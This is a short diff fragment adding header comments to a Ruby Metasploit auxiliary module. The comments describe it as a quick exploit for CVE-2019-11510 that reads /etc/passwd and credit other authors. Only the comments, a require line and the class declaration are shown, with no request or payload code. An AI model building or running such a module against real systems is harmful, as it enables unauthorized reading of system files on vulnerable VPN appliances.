@@ -1,3 +1,7 @@
+# Quick hackish exploit for the CVE-2019-11510
+# made with help from Alyssa Herrera
+# Sorry for using your exploit as a template Carlos E. Vieira
+# Grabs /etc/passwd
 require 'msf/core'
 class MetasploitModule < Msf::Auxiliary
 	include Msf::Exploit::Remote::HttpClient
